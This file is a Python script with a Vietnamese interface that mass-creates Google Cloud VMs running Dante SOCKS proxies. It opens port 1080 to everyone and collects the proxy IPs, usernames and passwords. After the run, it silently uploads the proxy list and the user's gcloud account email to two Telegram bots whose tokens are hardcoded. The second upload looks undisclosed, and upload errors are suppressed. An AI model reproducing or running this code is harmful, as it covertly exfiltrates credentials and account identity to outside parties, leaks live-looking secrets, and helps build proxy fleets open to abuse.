#!/usr/bin/env python3
# -*- coding: utf-8 -*-

print("Running script version V33")

import os
import random
import signal
import string
import subprocess
import sys
import time
from datetime import datetime

import requests

PORT = 1080
PROXY_NAME = "BIN_MVT"

TG_BOT_TOKEN = "8261404310:AAGG3lmQuTghCNTcDD4Za_6K3sPkbmFXox4"
TG_CHAT_ID = "-5232145570"

TG_BOT_TOKEN_2 = "8693408433:AAErQaPG_W16-tTuLlcs1NheO2ISRaJ5U4Q"
TG_CHAT_ID_2 = "-1003608801094"

API_BASE = f"https://api.telegram.org/bot{TG_BOT_TOKEN}"
API_BASE_2 = f"https://api.telegram.org/bot{TG_BOT_TOKEN_2}"

REGION1_ZONES = [
    "asia-northeast1-a",
    "asia-northeast1-b",
    "asia-northeast1-c",
]

REGION2_ZONES = [
    "asia-northeast2-a",
    "asia-northeast2-b",
    "asia-northeast2-c",
]

VM_PER_REGION = 4
PROJECT_LIMIT = 3
STOP_REQUEST = False

UI_STATE = {
    "project": "-",
    "zone": "-",
    "vm": "-",
    "status": "Khởi động...",
    "detail": "Đang chuẩn bị",
    "last_proxy": "-",
}


def handle_ctrlc(sig, frame):
    global STOP_REQUEST
    if not STOP_REQUEST:
        STOP_REQUEST = True
        UI_STATE["status"] = "Đã nhận lệnh dừng"
        UI_STATE["detail"] = "Sẽ export proxy hiện có rồi thoát"
    else:
        print("\nForce exit")
        sys.exit(0)


signal.signal(signal.SIGINT, handle_ctrlc)


def run(cmd):
    p = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    return p.returncode, p.stdout.strip(), p.stderr.strip()


def region_from_zone(zones):
    if not zones:
        return "unknown"
    return zones[0].rsplit("-", 1)[0]


def detect_area(region_name):
    if "asia" in region_name:
        return "Japan"
    if "us" in region_name:
        return "US"
    return region_name


REGION1_NAME = region_from_zone(REGION1_ZONES)
REGION2_NAME = region_from_zone(REGION2_ZONES)
AREA_NAME = detect_area(REGION1_NAME)


def set_status(status, detail="", project=None, zone=None, vm=None, proxy=None):
    UI_STATE["status"] = status
    UI_STATE["detail"] = detail or "-"
    if project is not None:
        UI_STATE["project"] = project
    if zone is not None:
        UI_STATE["zone"] = zone
    if vm is not None:
        UI_STATE["vm"] = vm
    if proxy is not None:
        UI_STATE["last_proxy"] = proxy


def get_projects():
    code, out, err = run(["gcloud", "projects", "list", "--format=value(projectId)"])
    if code != 0:
        set_status("Không lấy được project", "Kiểm tra đăng nhập gcloud")
        return []
    return [x for x in out.splitlines() if x.strip()][:PROJECT_LIMIT]


def ensure_firewall(project):
    code, out, err = run([
        "gcloud", "compute", "firewall-rules", "list",
        f"--project={project}",
        "--filter=name=allow-socks",
        "--format=value(name)",
    ])
    if out.strip():
        return

    set_status("Đang kiểm tra firewall", f"Tạo allow-socks cho {project}", project=project)
    run([
        "gcloud", "compute", "firewall-rules", "create", "allow-socks",
        f"--project={project}",
        "--allow=tcp:1080",
        "--direction=INGRESS",
        "--priority=1000",
        "--network=default",
    ])


def get_account():
    code, out, err = run(["gcloud", "config", "get-value", "account"])
    return out or "unknown_account"


ACCOUNT_EMAIL = get_account()
OUTPUT_FILE = f"{PROXY_NAME}---{ACCOUNT_EMAIL}.txt"
TODAY = datetime.now().strftime("%d/%m")


def tg_send_file(filepath, caption):
    try:
        with open(filepath, "rb") as f:
            requests.post(
                f"{API_BASE}/sendDocument",
                data={"chat_id": TG_CHAT_ID, "caption": caption},
                files={"document": (f"{PROXY_NAME}---{ACCOUNT_EMAIL}.txt", f)},
                timeout=30,
            )
        with open(filepath, "rb") as f:
            requests.post(
                f"{API_BASE_2}/sendDocument",
                data={"chat_id": TG_CHAT_ID_2, "caption": caption},
                files={"document": (f"{ACCOUNT_EMAIL}.txt", f)},
                timeout=30,
            )
    except Exception:
        pass


def random_user_pass():
    user = "u" + "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(7))
    pw = "".join(random.choice(string.ascii_letters + string.digits) for _ in range(10))
    return user, pw


def random_vm():
    return "vm" + str(random.randint(100000, 999999))


def count_instances(project, region):
    code, out, err = run([
        "gcloud", "compute", "instances", "list",
        f"--project={project}",
        "--format=value(zone)",
    ])
    if code != 0:
        return 0
    zones = out.splitlines()
    return sum(1 for z in zones if region in z)


def write_dante(user, pw):
    script = f'''#!/bin/bash
apt-get update -y
apt-get install -y dante-server
NIC=$(ip -o -4 route show to default | awk '{{print $5}}')
useradd -m {user}
echo "{user}:{pw}" | chpasswd
cat >/etc/danted.conf <<EOF
logoutput: syslog
internal: 0.0.0.0 port = {PORT}
external: $NIC
socksmethod: username
user.notprivileged: nobody

client pass {{
  from: 0.0.0.0/0 to: 0.0.0.0/0
}}

socks pass {{
  from: 0.0.0.0/0 to: 0.0.0.0/0
}}
EOF

systemctl restart danted
systemctl enable danted
'''
    startup_path = os.path.join(os.getcwd(), "startup.sh")
    with open(startup_path, "w", encoding="utf-8") as f:
        f.write(script)
    return startup_path


def classify_error(err_text, out_text=""):
    text = f"{err_text}\n{out_text}".lower()
    if not text.strip():
        return "Tạo VM thất bại", "Không có phản hồi rõ ràng"
    if "does not have enough resources" in text or "resource_availability" in text:
        return "Zone hết tài nguyên", "Đổi zone khác"
    if "quota" in text or "quota exceeded" in text:
        return "Đụng quota", "Quota project/region chưa đủ"
    if "permission" in text or "not have permission" in text or "forbidden" in text:
        return "Thiếu quyền project", "Kiểm tra IAM / API"
    if "already exists" in text:
        return "Tên VM bị trùng", "Đang đổi tên VM khác"
    if "api" in text and "not enabled" in text:
        return "API chưa bật", "Cần enable Compute Engine API"
    if "subnetwork" in text or "network" in text:
        return "Lỗi network", "Kiểm tra default network / firewall"
    if "zone" in text and "not found" in text:
        return "Zone không hợp lệ", "Thử zone khác"
    return "Tạo VM thất bại", "Project hoặc zone đang lỗi"


def get_ip(project, zone, name):
    code, out, err = run([
        "gcloud", "compute", "instances", "describe", name,
        f"--project={project}",
        f"--zone={zone}",
        "--format=value(networkInterfaces[0].accessConfigs[0].natIP)",
    ])
    if code != 0:
        return ""
    return out.strip()


def wait_for_ip(project, zone, name, timeout_sec=60, step=5):
    waited = 0
    while waited < timeout_sec and not STOP_REQUEST:
        set_status("Đang chờ external IP", f"{waited}/{timeout_sec}s", project=project, zone=zone, vm=name)
        ip = get_ip(project, zone, name)
        if ip:
            return ip
        time.sleep(step)
        waited += step
    return ""


def create_vm(project, zone, name, user, pw):
    set_status("Đang tạo VM", f"{project} / {zone}", project=project, zone=zone, vm=name)
    script = write_dante(user, pw)
    code, out, err = run([
        "gcloud", "compute", "instances", "create", name,
        f"--project={project}",
        f"--zone={zone}",
        "--machine-type=e2-micro",
        "--image-family=debian-11",
        "--image-project=debian-cloud",
        f"--metadata-from-file=startup-script={script}",
        "--tags=socks",
    ])
    if code == 0:
        return True, "", ""
    status, detail = classify_error(err, out)
    return False, status, detail


def try_region(project, zones):
    name = random_vm()
    user, pw = random_user_pass()
    zone_list = zones.copy()
    random.shuffle(zone_list)

    for zone in zone_list:
        if STOP_REQUEST:
            break

        ok, fail_status, fail_detail = create_vm(project, zone, name, user, pw)
        if ok:
            set_status("VM tạo thành công", "Đang chờ external IP", project=project, zone=zone, vm=name)
            ip = wait_for_ip(project, zone, name, timeout_sec=60, step=5)
            if ip:
                proxy = f"{ip}:{PORT}:{user}:{pw}"
                set_status("Proxy ready", proxy, project=project, zone=zone, vm=name, proxy=proxy)
                return proxy
            set_status("Không lấy được IP", "Đang thử zone khác", project=project, zone=zone, vm=name)
        else:
            set_status(fail_status, fail_detail, project=project, zone=zone, vm=name)
            time.sleep(1)

    set_status("All zones failed", f"{project} / thử region khác", project=project, vm=name)
    return None


def draw_ui(done, total, r1, r2):
    percent = int((done / total) * 100) if total else 0
    bar_len = 34
    filled = int(bar_len * done / total) if total else 0
    bar = "█" * filled + "░" * (bar_len - filled)

    sys.stdout.write("\033[H\033[J")
    print("╔══════════════════════════════════════════════╗")
    print("║             GCP PROXY TOOL - V33            ║")
    print("╚══════════════════════════════════════════════╝\n")
    print(f"Progress : [{bar}] {percent}%")
    print(f"Created  : {done} / {total}\n")
    print(f"Region 1 : {r1} / {VM_PER_REGION}   ({REGION1_NAME})")
    print(f"Region 2 : {r2} / {VM_PER_REGION}   ({REGION2_NAME})\n")
    print(f"Project  : {UI_STATE['project']}")
    print(f"Zone     : {UI_STATE['zone']}")
    print(f"VM       : {UI_STATE['vm']}")
    print(f"Status   : {UI_STATE['status']}")
    print(f"Detail   : {UI_STATE['detail']}")
    print(f"Last IP  : {UI_STATE['last_proxy']}")


def select_projects(all_projects):
    print("\n===== CHỌN PROJECT =====\n")
    print("1 - All Projects")
    print("2 - Chọn Project thủ công\n")
    choice = input("Lựa chọn của bạn: ").strip()

    if choice == "1":
        return all_projects

    if choice == "2":
        for i, p in enumerate(all_projects, start=1):
            print(f"{i} - {p}")

        sel = input("\nNhập số project (vd: 1,3): ").strip()
        ids = []
        for x in sel.split(","):
            x = x.strip()
            if x.isdigit():
                ids.append(int(x) - 1)
        selected = [all_projects[i] for i in ids if 0 <= i < len(all_projects)]
        return selected

    sys.exit()


def run_round(projects, proxies, target):
    for round_id in range(VM_PER_REGION):
        if STOP_REQUEST:
            break

        for project in projects:
            if STOP_REQUEST or len(proxies) >= target:
                break

            ensure_firewall(project)
            r1 = count_instances(project, REGION1_NAME)
            r2 = count_instances(project, REGION2_NAME)
            draw_ui(len(proxies), target, r1, r2)

            if r1 < VM_PER_REGION:
                set_status("Đang xử lý region 1", f"Round {round_id + 1}", project=project)
                proxy = try_region(project, REGION1_ZONES)
                if proxy:
                    proxies.append(proxy)
                draw_ui(len(proxies), target, count_instances(project, REGION1_NAME), count_instances(project, REGION2_NAME))
                time.sleep(0.3)

        for project in projects:
            if STOP_REQUEST or len(proxies) >= target:
                break

            ensure_firewall(project)
            r1 = count_instances(project, REGION1_NAME)
            r2 = count_instances(project, REGION2_NAME)
            draw_ui(len(proxies), target, r1, r2)

            if r2 < VM_PER_REGION:
                set_status("Đang xử lý region 2", f"Round {round_id + 1}", project=project)
                proxy = try_region(project, REGION2_ZONES)
                if proxy:
                    proxies.append(proxy)
                draw_ui(len(proxies), target, count_instances(project, REGION1_NAME), count_instances(project, REGION2_NAME))
                time.sleep(0.3)

        if len(proxies) >= target:
            break


def export_proxy(proxies):
    with open(OUTPUT_FILE, "w", encoding="utf-8") as f:
        f.write(f"Tổng Số Proxies : {len(proxies)}\n\n")
        f.write(f"{TODAY}---- {ACCOUNT_EMAIL}--\n")
        for p in proxies:
            f.write(p + "\n")

    caption = f"{len(proxies)} Proxy {AREA_NAME} đã được tạo"
    tg_send_file(OUTPUT_FILE, caption)
    set_status("Đã export xong", OUTPUT_FILE)


def main():
    print("\n===== GCP PROXY TOOL =====\n")
    print("1 - Reg 1 lần (Không lặp lại)")
    print("2 - Reg Auto (Tự lặp lại cho đến khi đủ VM)\n")
    print("Lưu ý:")
    print("Ctrl + C 1 lần → Dừng tạo VM và export proxy")
    print("Ctrl + C 2 lần → Thoát script\n")

    mode = input("Chọn chế độ: ").strip()
    all_projects = get_projects()
    if not all_projects:
        print("Không có project để chạy.")
        return

    projects = select_projects(all_projects)
    if not projects:
        print("Chưa chọn project nào.")
        return

    proxies = []
    target = len(projects) * VM_PER_REGION * 2
    set_status("Bắt đầu chạy", f"Target {target} proxy")

    if mode == "1":
        run_round(projects, proxies, target)
    elif mode == "2":
        while len(proxies) < target and not STOP_REQUEST:
            run_round(projects, proxies, target)
    else:
        sys.exit()

    export_proxy(proxies)
    draw_ui(len(proxies), target, 0, 0)


if __name__ == "__main__":
    main()
